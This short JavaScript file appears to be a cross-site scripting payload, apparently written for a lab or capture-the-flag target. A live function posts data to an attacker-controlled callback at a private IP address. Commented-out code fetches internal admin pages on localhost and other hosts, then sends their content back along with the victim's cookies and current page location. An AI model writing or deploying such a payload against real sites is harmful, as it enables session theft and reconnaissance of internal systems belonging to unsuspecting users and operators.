const notify = (args) => {
  fetch("http://10.33.1.86:8000/index.php?callback=true", {
    method: "POST",
    body: JSON.stringify({ ...args, tick: new Date() }),
  });
};

// const fetchPage = (url) =>
//   fetch(url)
//     .then((res) => res.text())
//     .then((content) => notify({ content, url }))
//     .catch((error) => notify({ url, test:'bho', error:JSON.stringify(error) }));

// fetchPage("http://localhost/admin/");
// fetchPage("http://10.10.10.3/admin/");
// fetchPage("http://10.33.1.86/index.php");

// try {
//   let payload = {
//     location: window.location.href,
//     cookie: document.cookie,
//     top: top !== self,
//     adminPage: response,
//   };
//   notify({ payload });
// } catch (error) {
//   notify({ error, step: 1 });
// }
